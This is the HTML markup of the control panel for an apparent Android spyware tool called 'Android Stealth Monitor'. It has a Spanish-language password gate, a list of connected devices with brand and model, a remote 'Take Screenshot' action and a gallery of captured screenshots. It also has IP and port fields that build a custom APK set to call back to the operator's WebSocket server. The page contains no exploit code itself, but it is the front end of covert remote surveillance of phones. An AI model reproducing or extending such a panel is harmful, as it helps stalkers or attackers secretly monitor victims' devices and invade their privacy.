<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Stealth Monitor</title>


    <!-- CSS -->
    <link rel="stylesheet" href="../css/index.css">
    <link rel="stylesheet" href="../css/nice-select.css">


    <!-- JS -->
    <script src="../js/socketIo.js" defer></script>
    <script src="../js/jquery.js" defer></script>
    <script src="../js/jquery.nice-select.min.js" defer></script>
    <script src="../js/index.js" defer></script>

</head>
<body>
    <div id="passwordOverlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; z-index: 9999;">
        <div style="background-color: white; padding: 2rem; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.3); text-align: center;">
            <h2>Acceso Restringido</h2>
            <p>Ingrese la clave de acceso:</p>
            <input type="password" id="passwordInput" style="padding: 0.5rem; margin: 1rem 0; width: 200px; font-size: 1rem;">
            <br>
            <button id="passwordSubmit" style="padding: 0.5rem 1rem; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Acceder</button>
        </div>
    </div>
    <div id="mainBody" style="display: none;">
        <header>
            <img src="../img/eye.png" alt="">
            <p>ANDROID STEALTH MONITOR</p>
        </header>
        <div id="container">
            <form id="left">
                <div id="leftBG"></div>
                <div id="options" class="backdrop-container">
                    <div style="padding: 1rem 1rem 0 1rem;background-color: #ffffff;border-radius: 5px 5px 0 0;">
                        <select name="devices" id="devices" class="wide" onchange="getInfo(this.value)">
                            <option data-display="Devices">None</option>
                        </select>
                    </div>
                    <div id="infos">
                        <div class="info">
                            <span>Brand :</span>
                            <span>--</span>
                        </div>
                        <div class="info">
                            <span>Model :</span>
                            <span>--</span>
                        </div>
                        <div class="info">
                            <span>Manufacturer :</span>
                            <span>--</span>
                        </div>
                        <div class="device-action">
                            <div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot">
                                <img src="../img/screenshot.png" alt="Take Screenshot">
                                <span>Take Screenshot</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="section-container">
                    <div class="input-row">
                        <input type="text" id="ipInput" placeholder="IP/Domain" value="">
                        <input type="text" id="portInput" placeholder="Port" value="">
                    </div>
                    <div class="button-container">
                        <div class="section-apk-inline" onclick="download()" title="Build a custom APK configured with your running WebSocket server details to establish the connection between the Android client and your control server.">
                            <img src="../img/build.png" alt="Build APK">
                            <span id="buildButtonText">Build APK</span>
                        </div>
                    </div>
                    <div id="buildProgress" class="build-progress" style="display: none;">
                        <div class="progress-bar">
                            <div class="progress-fill"></div>
                        </div>
                        <div class="progress-text">Building APK...</div>
                    </div>
                </div>
                <div class="section-container">
                    <div class="button-container">
                        <div class="section-apk-inline" onclick="downloadLatest()" title="Download the latest APK">
                            <img src="../img/download.png" alt="Download the last APK">
                            <span>Download APK</span>
                        </div>
                    </div>
                </div>
            </form>
            <div id="right">
                <div id="tabs">
                    <button class="tab-button active" onclick="showTab('logs')">Logs</button>
                    <button class="tab-button" onclick="showTab('screenshots')">Screenshots</button>
                </div>
                <div id="logs-tab" class="tab-content active">
                    <textarea name="output" spellcheck="false" id="output" disabled></textarea>
                </div>
                <div id="screenshots-tab" class="tab-content">
                    <div id="screenshots-gallery">
                        <div id="screenshots-list"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="msgs">
    </div>
</body>
</html>